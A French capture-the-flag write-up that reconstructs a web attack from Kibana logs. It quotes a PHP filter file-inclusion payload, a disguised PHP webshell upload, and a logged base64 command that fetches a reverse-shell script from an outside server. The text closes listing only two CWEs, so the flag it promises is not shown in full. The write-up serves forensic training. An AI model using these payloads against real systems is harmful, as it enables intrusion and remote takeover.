---
title: Mission 2 - SOC
weight: 1
---

# Mission 2 : SOC 

Dans cette deuxième mission, on nous fournit des logs sur Kibana pour analyser l'attaque d'un membre de NullVastation.  Pour trouver le drapeau, il faudra concaténer : 
- Les CWE exploitées par l'attaquant.
- L'adresse du serveur d'exfiltration utilisé par l'attaquant. 
- le chemin du fichier utilisé pour rendre l'exploit permanent.

## Local File Inclusion 

On observe un pic d'activité, ce pic s'apparente à du fuzzing : l'attaquant essaye de truver une vulnérabilité dans le système. On peut supposer qu'à la fin de ce pic l'attaquant va exploiter la faille. On trouve alors la première exploitation : 

```
/?lang=php://filter/read=convert.base64-encode&page=resource=db/connect
```

L'attaquant arrive ici à lire les informations de connexion et s'authentifie peu après sur la page d'administration. 

## Telechargement d'un reverse shell 

Après s'être authentifié, l'attaquant va téléverser du code php `ev1L.php.png` pour pouvoir exécuter des commandes sur la machine :  

```
/admin-page/manage.php?success=true&path=upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png 
```

il va en suite télécharger un reverse shell via ce même script : 

```
10.143.17.101 - - [28/Mar/2025:00:32:16 +0100] "GET /admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo+'d2dldCBodHRwOi8vMTYzLjE3Mi42Ny4yMDE6NDk5OTkvczFtcGwzLXIzdnNoM2xsLXZwcy5zaA=='|base64+-d|sh HTTP/1.1" 200 2144 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"

```

Sachant qu'en base64 : 

```
d2dldCBodHRwOi8vMTYzLjE3Mi42Ny4yMDE6NDk5OTkvczFtcGwzLXIzdnNoM2xsLXZwcy5zaA==
http://163.172.67.201:49999/s1mpl3-r3vsh3ll-vps.sh
```


On a alors tous nos éléments pour former notre drapeau : 

- CWE-98 : Improper Control of Filename
- CWE-434 : Unrestricted Upload of File

